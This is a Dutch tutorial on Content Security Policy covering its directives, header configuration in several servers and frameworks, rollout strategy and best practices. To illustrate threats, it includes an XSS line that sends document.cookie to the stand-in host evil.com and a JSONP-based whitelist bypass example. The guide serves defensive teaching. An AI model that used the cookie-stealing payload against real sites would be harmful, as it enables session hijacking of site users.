# Onderzoek naar Content Security Policy (CSP)
In dit document wordt onderzocht hoe Content Security Policy (CSP) kan worden geïmplementeerd in een webapplicatie om de beveiliging te verbeteren. CSP is een krachtige beveiligingsmaatregel die helpt bij het voorkomen van cross-site scripting (XSS) en andere code-injectie-aanvallen door te specificeren welke bronnen vertrouwd zijn.

## Inhoudsopgave
 
1. [Wat is CSP?](#1-wat-is-csp)
2. [Waarvoor dient CSP?](#2-waarvoor-dient-csp)
3. [Waartegen beschermt CSP?](#3-waartegen-beschermt-csp)
4. [Hoe werkt CSP?](#4-hoe-werkt-csp)
5. [Hoe implementeer je CSP?](#5-hoe-implementeer-je-csp)
6. [Voorbeelden van CSP-headers](#6-voorbeelden-van-csp-headers)
7. [Best practices](#7-best-practices)
8. [Extra te weten over CSP](#8-extra-te-weten-over-csp)
9. [Conclusie](#9-conclusie)
---

## 1. Wat is CSP?
 
**Content Security Policy (CSP)** is een beveiligingsmechanisme voor het web dat via een HTTP-responseheader (of een `<meta>`-tag) aan de browser communiceert welke bronnen op een pagina geladen en uitgevoerd mogen worden.
 
CSP is een **W3C-standaard** en wordt ondersteund door alle moderne browsers. Het werd geïntroduceerd als antwoord op de opkomst van Cross-Site Scripting (XSS) en aanverwante injectie-aanvallen.
 
In essentie is CSP een **whitelist-mechanisme**: alleen expliciet goedgekeurde bronnen worden toegestaan. Al het overige wordt geblokkeerd.
 
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```
 
---
 
## 2. Waarvoor dient CSP?
 
CSP dient primair als een **extra verdedigingslaag** bovenop andere beveiligingsmaatregelen (zoals input-validatie en output-escaping). Het beperkt de schade die een aanvaller kan aanrichten *nadat* een kwetsbaarheid is misbruikt.
 
| Doel | Omschrijving |
|---|---|
| **Scriptbeveiliging** | Voorkomt uitvoering van niet-goedgekeurde scripts |
| **Bronbeperking** | Beperkt van welke domeinen resources geladen mogen worden |
| **Inline-blokkering** | Blokkeert inline scripts en `eval()` standaard |
| **Rapportage** | Stelt beheerders in staat om schendingen te monitoren |
| **Defense in depth** | Fungeert als vangnet bij onvermijdelijke kwetsbaarheden |
 
> **Belangrijk:** CSP vervangt geen correcte input-validatie of output-escaping. Het is een aanvullende laag, geen vervanging.
 
---
 
## 3. Waartegen beschermt CSP?
 
### 3.1 Primaire bescherming
 
#### Cross-Site Scripting (XSS)
CSP is specifiek ontworpen om de impact van XSS te beperken. Zelfs als een aanvaller kwaadaardige scriptcode in een pagina injecteert, kan de browser die code weigeren uit te voeren als de bron niet is goedgekeurd.
 
```
Aanvaller injecteert:
<script>document.location='https://evil.com/?c='+document.cookie</script>
 
Zonder CSP: script wordt uitgevoerd ✗
Met CSP (script-src 'self'): script geblokkeerd, bron is niet 'self' ✓
```
 
#### Clickjacking (gedeeltelijk)
Via de `frame-ancestors`-directive kan CSP bepalen in welke frames een pagina mag worden ingesloten — vergelijkbaar met de `X-Frame-Options`-header, maar krachtiger.
 
#### Data injection
Door te beperken welke verbindingen een pagina mag openen (`connect-src`), kan CSP voorkomen dat gestolen data naar externe servers wordt gestuurd.
 
#### Mixed content
CSP kan afdwingen dat alle resources via HTTPS geladen worden, wat man-in-the-middle aanvallen bemoeilijkt.
 
### 3.2 Waartegen beschermt CSP NIET?
 
| Aanval | Reden |
|---|---|
| **SQL-injectie** | Serversijds probleem, CSP is een browserbeleid |
| **CSRF** | Ander aanvalsmodel; hiervoor zijn CSRF-tokens en SameSite cookies nodig |
| **Server-side aanvallen** | CSP opereert enkel in de browser |
| **Stored XSS (deels)** | Kan impact beperken, maar niet de opslag zelf voorkomen |
| **Social engineering** | Geen technisch mechanisme |
 
---
 
## 4. Hoe werkt CSP?
 
### 4.1 Mechanisme
 
```
┌─────────────────────────────────────────────────────────┐
│                        SERVER                           │
│                                                         │
│  HTTP Response:                                         │
│  Content-Security-Policy: script-src 'self'             │
└──────────────────────┬──────────────────────────────────┘
                       │ HTTP Response + CSP-header
                       ▼
┌─────────────────────────────────────────────────────────┐
│                       BROWSER                           │
│                                                         │
│  Pagina laadt → Browser leest CSP-policy                │
│                                                         │
│  <script src="https://cdn.example.com/lib.js">          │
│       └─→ Bron niet in whitelist → GEBLOKKEERD ✗        │
│                                                         │
│  <script src="/js/app.js">                              │
│       └─→ Bron = 'self' → TOEGESTAAN ✓                  │
└─────────────────────────────────────────────────────────┘
```
 
### 4.2 Directives (richtlijnen)
 
Elke CSP-policy bestaat uit één of meerdere **directives**, gescheiden door een puntkomma.
 
#### Resource-directives
 
| Directive | Beheert |
|---|---|
| `default-src` | Fallback voor alle resource-types |
| `script-src` | JavaScript-bestanden en inline scripts |
| `style-src` | CSS-bestanden en inline stijlen |
| `img-src` | Afbeeldingen |
| `font-src` | Lettertypen |
| `connect-src` | Fetch, XHR, WebSocket, EventSource |
| `media-src` | Audio en video |
| `object-src` | `<object>`, `<embed>`, `<applet>` |
| `frame-src` | Iframes |
| `worker-src` | Web Workers, Service Workers |
| `manifest-src` | Web App Manifests |
 
#### Navigatie- en embedding-directives
 
| Directive | Beheert |
|---|---|
| `form-action` | Waarheen formulieren mogen worden verstuurd |
| `frame-ancestors` | Wie de pagina in een `<iframe>` mag insluiten |
| `navigate-to` | Waarheen de pagina mag navigeren |
| `base-uri` | De toegelaten waarden voor `<base href>` |
 
#### Rapportage-directives
 
| Directive | Beheert |
|---|---|
| `report-uri` | (Verouderd) URL voor schendingsrapporten |
| `report-to` | Moderne vervanger van `report-uri` |
 
### 4.3 Bronwaarden (source values)
 
| Waarde | Betekenis |
|---|---|
| `'self'` | Zelfde oorsprong (scheme + host + port) |
| `'none'` | Geen enkele bron toegestaan |
| `'unsafe-inline'` | Inline scripts/stijlen toegestaan (vermijden!) |
| `'unsafe-eval'` | `eval()` en verwante functies toegestaan (vermijden!) |
| `'nonce-<base64>'` | Eenmalig token dat inline scripts whitelisten |
| `'sha256-<hash>'` | Specifiek inline script via hash whitelisten |
| `https:` | Alle HTTPS-bronnen |
| `https://cdn.example.com` | Specifiek domein via HTTPS |
| `*.example.com` | Wildcard subdomein |
| `'strict-dynamic'` | Vertrouwen doorgeven via nonces/hashes |
| `'unsafe-hashes'` | Hashes voor inline event handlers |
 
---
 
## 5. Hoe implementeer je CSP?
 
### 5.1 Via HTTP-header (aanbevolen)
 
De meest robuuste methode is het instellen via de serverrespons.
 
#### Nginx
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; form-action 'self';";
```
 
#### Apache
```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self';"
```
 
#### FastAPI (Python)
```python
from fastapi import FastAPI
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
 
class CSPMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self'; "
            "style-src 'self'; "
            "img-src 'self' data:; "
            "connect-src 'self'; "
            "frame-ancestors 'none'; "
            "form-action 'self';"
        )
        return response
 
app = FastAPI()
app.add_middleware(CSPMiddleware)
```
 
#### Express.js (Node.js) — via Helmet
```javascript
const helmet = require('helmet');
 
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'"],
    imgSrc: ["'self'", "data:"],
    connectSrc: ["'self'"],
    frameAncestors: ["'none'"],
    formAction: ["'self'"],
  },
}));
```
 
### 5.2 Via `<meta>`-tag (beperkte optie)
 
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self';">
```
 
> **Beperkingen van de `<meta>`-aanpak:**
> - `frame-ancestors` werkt **niet** via `<meta>`
> - `report-uri` werkt **niet** via `<meta>`
> - Minder veilig: aanvaller die HTML kan injecteren kan de tag manipuleren
> - Enkel bruikbaar als serverheaders niet configureerbaar zijn
 
### 5.3 Implementatiestrategie (stap voor stap)
 
```
Stap 1: Report-Only modus aanzetten
         → Schendingen rapporteren zonder te blokkeren
 
Stap 2: Rapporten analyseren
         → Welke bronnen worden gebruikt?
 
Stap 3: Policy verfijnen
         → Legitieme bronnen whitelisten
 
Stap 4: Overschakelen naar enforcement modus
         → Content-Security-Policy (zonder -Report-Only)
 
Stap 5: Monitoren & onderhouden
         → Policy bijhouden bij elke codewijziging
```
 
### 5.4 Report-Only modus
 
Gebruik `Content-Security-Policy-Report-Only` om een policy te testen zonder te blokkeren:
 
```
Content-Security-Policy-Report-Only: default-src 'self'; report-to /csp-reports
```
 
Schendingen worden gerapporteerd maar **niet** geblokkeerd. Ideaal voor de roll-out fase.
 
---
 
## 6. Voorbeelden van CSP-headers
 
### 6.1 Minimale, strikte policy
 
```
Content-Security-Policy:
  default-src 'none';
  script-src 'self';
  style-src 'self';
  img-src 'self';
  connect-src 'self';
  font-src 'self';
  form-action 'self';
  frame-ancestors 'none';
  base-uri 'self';
```
 
Alles geblokkeerd tenzij expliciet toegestaan. Meest veilig, maar vereist nauwkeurige configuratie.
 
---
 
### 6.2 Policy met externe CDN
 
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net;
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https://images.example.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
```
 
---
 
### 6.3 Policy met nonce (voor inline scripts)
 
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-rAnd0mBase64==';
  style-src 'self' 'nonce-rAnd0mBase64==';
```
 
In de HTML:
```html
<script nonce="rAnd0mBase64==">
  // Dit inline script is toegestaan
  console.log("Veilig inline script");
</script>
```
 
> De nonce moet **per request** opnieuw gegenereerd worden en cryptografisch willekeurig zijn (min. 128 bits).
 
---
 
### 6.4 Policy met hash (voor statische inline scripts)
 
```
Content-Security-Policy:
  script-src 'self' 'sha256-RFWPLDbv2BY+rCkDzsE+0fr8ylGr2R2faWMhq4lfEQc=';
```
 
De hash is een Base64-gecodeerde SHA-256 van de exacte scriptinhoud. Wijzigt de inhoud, dan klopt de hash niet meer.
 
---
 
### 6.5 Strict policy met `strict-dynamic`
 
```
Content-Security-Policy:
  script-src 'nonce-abc123' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```
 
`'strict-dynamic'` staat toe dat scripts die al vertrouwd zijn (via nonce) dynamisch nieuwe scripts laden — zonder dat die nieuwe scripts in de whitelist hoeven te staan. Domeinwhitelists worden genegeerd.
 
---
 
### 6.6 Vergelijkingstabel
 
| Policy type | Veiligheid | Complexiteit | Gebruik |
|---|---|---|---|
| Strict (`'none'` als default) | ★★★★★ | Hoog | Nieuwe projecten |
| Nonce-based | ★★★★☆ | Middel | SSR-applicaties |
| Hash-based | ★★★★☆ | Middel | Statische pagina's |
| Domeinwhitelist | ★★★☆☆ | Laag | Legacy projecten |
| `unsafe-inline` | ★☆☆☆☆ | Zeer laag | Niet aanbevolen |
 
---
 
## 7. Best practices
 
### 7.1 Doe's ✓
 
- **Begin met `default-src 'none'`** — voeg enkel toe wat nodig is
- **Gebruik nonces voor inline scripts** — genereer ze per request, nooit hardcoded
- **Zet `frame-ancestors 'none'`** — beschermt tegen clickjacking
- **Stel `base-uri 'self'` in** — voorkomt base-tag-injectie
- **Stel `form-action 'self'` in** — beperkt waar formulieren naartoe mogen sturen
- **Gebruik `object-src 'none'`** — plugins (Flash, etc.) zijn een risico
- **Monitor via `report-to`** — schendingen zichtbaar maken
- **Test eerst in Report-Only** — voorkom productiestoringen
- **Automatiseer nonce-generatie** — via middleware of templating engine
- **Herzie de policy bij codewijzigingen** — CSP is levend document
### 7.2 Dont's ✗
 
- **Vermijd `'unsafe-inline'`** — neutraliseert XSS-bescherming volledig
- **Vermijd `'unsafe-eval'`** — staat `eval()`, `setTimeout(string)`, etc. toe
- **Vermijd wildcard `*`** als `script-src` — laadt scripts van overal
- **Nooit nonces hergebruiken** — ze moeten éénmalig en random zijn
- **Niet vertrouwen op `<meta>`** voor kritieke directives
- **Niet vergeten `https:`** te vereisen voor externe bronnen
### 7.3 Checklist bij deployment
 
```
☐ Content-Security-Policy header aanwezig?
☐ default-src gedefinieerd?
☐ script-src zonder 'unsafe-inline' en 'unsafe-eval'?
☐ object-src 'none' of beperkt?
☐ frame-ancestors geconfigureerd?
☐ base-uri beperkt?
☐ form-action beperkt?
☐ Nonces cryptografisch willekeurig en per-request?
☐ Report-Only fase doorlopen vóór enforcement?
☐ Rapportage geconfigureerd?
```
 
---
 
## 8. Extra te weten over CSP
 
### 8.1 CSP Level 1, 2 en 3
 
CSP bestaat in drie versies met uitbreidende mogelijkheden:
 
| Versie | Belangrijkste toevoegingen | Browserondersteuning |
|---|---|---|
| **CSP Level 1** | Basiswhitelisting van bronnen | Alle moderne browsers |
| **CSP Level 2** | Nonces, hashes, `frame-ancestors`, `form-action` | Alle moderne browsers |
| **CSP Level 3** | `'strict-dynamic'`, `'unsafe-hashes'`, `navigate-to`, `worker-src` | Grotendeels ondersteund |
 
### 8.2 CSP en `'strict-dynamic'` bypass
 
Een veelgemaakte fout is het vertrouwen op domeinwhitelists terwijl die omzeild kunnen worden. Aanvallers kunnen een JSONP-eindpunt op een whitelisted domein misbruiken om willekeurige code te injecteren:
 
```
script-src https://trusted-cdn.com
→ Aanvaller misbruikt: https://trusted-cdn.com/jsonp?callback=alert(1)
```
 
**Oplossing:** gebruik `'strict-dynamic'` + nonces in plaats van domeinwhitelists.
 
### 8.3 Interactie met andere security-headers
 
CSP werkt het best in combinatie met andere HTTP-headers:
 
| Header | Samenwerking met CSP |
|---|---|
| `X-Frame-Options` | Vervangbaar door `frame-ancestors` in CSP, maar houd beide aan voor oude browsers |
| `X-Content-Type-Options: nosniff` | Voorkomt MIME-sniffing, complementair aan CSP |
| `Referrer-Policy` | Beperkt informatielekken via referrer |
| `Permissions-Policy` | Beheert browser-API's (camera, microfoon, geolocation) |
| `Strict-Transport-Security` | Dwingt HTTPS af; werkt samen met `upgrade-insecure-requests` |
 
### 8.4 `upgrade-insecure-requests`
 
Een speciale CSP-directive die de browser instrueert om alle HTTP-verzoeken automatisch te upgraden naar HTTPS, zonder te blokkeren:
 
```
Content-Security-Policy: upgrade-insecure-requests
```
 
Nuttig bij migraties van HTTP naar HTTPS.
 
### 8.5 `block-all-mixed-content`
 
Blokkeert actief het laden van HTTP-resources op een HTTPS-pagina:
 
```
Content-Security-Policy: block-all-mixed-content
```
 
> Browsers blokkeren mixed content steeds strenger van nature; deze directive is grotendeels overbodig geworden maar kan expliciet ingesteld worden voor oudere browsers.
 
### 8.6 Rapportage met de Reporting API
 
De moderne manier van CSP-rapportage werkt via de `Reporting-Endpoints`-header:
 
```http
Reporting-Endpoints: csp-endpoint="https://example.com/csp-reports"
Content-Security-Policy: default-src 'self'; report-to csp-endpoint
```
 
Een schendingsrapport ziet er als volgt uit (JSON):
 
```json
{
  "type": "csp-violation",
  "body": {
    "documentURL": "https://example.com/page",
    "referrer": "",
    "violatedDirective": "script-src",
    "effectiveDirective": "script-src",
    "originalPolicy": "default-src 'self'; script-src 'self'",
    "blockedURL": "https://evil.com/malicious.js",
    "statusCode": 200
  }
}
```
 
### 8.7 CSP en Single Page Applications (SPA)
 
Bij SPA's (React, Vue, Angular) brengt CSP extra uitdagingen:
 
- **Bundelers injecteren vaak inline scripts** — gebruik nonces of hashes
- **Dynamic imports** vereisen zorgvuldige `script-src`-configuratie
- **Source maps** kunnen gevoelige info lekken — `worker-src` beperken
- **`'strict-dynamic'`** is vaak de meest pragmatische keuze voor SPA's
### 8.8 Browserondersteuning en fallback
 
```
Chrome  ✓  (CSP 1/2/3)
Firefox ✓  (CSP 1/2/3)
Safari  ✓  (CSP 1/2, deels 3)
Edge    ✓  (CSP 1/2/3)
IE 11   ⚠  (CSP 1 via X-Content-Security-Policy, niet standaard)
```
 
CSP degradeert gracefully: browsers die CSP niet kennen, negeren de header gewoon. Ze zijn dan minder beschermd, maar de applicatie blijft functioneren.
 
### 8.9 CSP testen
 
Handige tools:
 
| Tool | Gebruik |
|---|---|
| [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/) | Policy analyseren op zwakheden |
| [Observatory (Mozilla)](https://observatory.mozilla.org/) | Algemene security-headercheck |
| Browser DevTools → Console | Schendingen verschijnen als console-errors |
| Burp Suite | Interceptie en aanpassing van headers tijdens pentesting |
 
---
 
## 9. Conclusie
 
Content Security Policy is een krachtig en gestandaardiseerd mechanisme om webapplicaties te beveiligen tegen injectie-aanvallen, in het bijzonder XSS. Door de browser te instrueren welke bronnen vertrouwd zijn, beperkt CSP de schade die een aanvaller kan aanrichten — ook wanneer er een kwetsbaarheid aanwezig is in de applicatie zelf.
 
**De kernprincipes samengevat:**
 
- CSP is een **defense-in-depth maatregel**, geen vervanging van correcte input-/outputverwerking
- Een sterke policy vertrekt van **`default-src 'none'`** en voegt enkel het noodzakelijke toe
- **`'unsafe-inline'` en `'unsafe-eval'`** zijn vrijwel altijd het verkeerde antwoord — gebruik nonces of hashes
- **`frame-ancestors 'none'`**, **`base-uri 'self'`** en **`form-action 'self'`** zijn essentiële aanvullingen
- **Report-Only modus** is onmisbaar voor een veilige roll-out
- CSP is een **levend document** dat mee-evolueert met de applicatie
Een goed geconfigureerde CSP maakt het voor een aanvaller dramatisch moeilijker om gestolen sessies te misbruiken, data te exfiltreren of persistente XSS-payloads te laten uitvoeren — zelfs als er een kwetsbaarheid wordt gevonden.
 
---
 
*Referenties: [MDN Web Docs — CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) · [W3C CSP Level 3 Spec](https://www.w3.org/TR/CSP3/) · [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)*
